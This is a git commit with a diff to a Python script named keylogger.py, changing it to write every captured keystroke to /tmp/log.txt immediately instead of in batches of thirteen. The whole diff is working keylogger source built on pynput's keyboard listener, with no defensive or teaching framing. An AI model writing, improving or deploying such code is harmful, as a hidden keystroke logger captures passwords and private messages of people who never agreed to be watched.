34af62562bda4af5675f96b2b4003b7953a8cc1d
Shreyansh Singh <45299337+k4m1k4z13r@users.noreply.github.com>
2019-03-21 15:46:39 +0530

    change keylogger code
    make it log every key immediately after it is pressed

--- keylogger.py
+++ keylogger.py
@@ -1,21 +1,13 @@
 #k4m1k4z13r wuz here
 from pynput.keyboard import Key, Listener
 
-count = 0
-keys = []
-def log(keys): #log the keys iteratively into a file
-	with open('/tmp/log.txt','a') as f:
-		for key in keys:
-			f.write(str(key)+"\n")
+
+def log(key): #log the keys iteratively into a file
+	with open('/tmp/log.txt','a') as f: #open log file in append mode
+		f.write(str(key)+"\n") #write the key to the log file
 
 def _pressed(key): #when a key is pressed
-	global keys, count
-	keys.append(key)
-	count += 1
-	if count >= 13: #if count equals or exceeds 13
-		count = 0 #re-initialise the count variable
-		log(keys) #log what you have
-		keys = [] #re-initialise the keys list
+	log(key) #log that key immediately
 
 def _released(key): #when a key is released
 	pass #do nothing
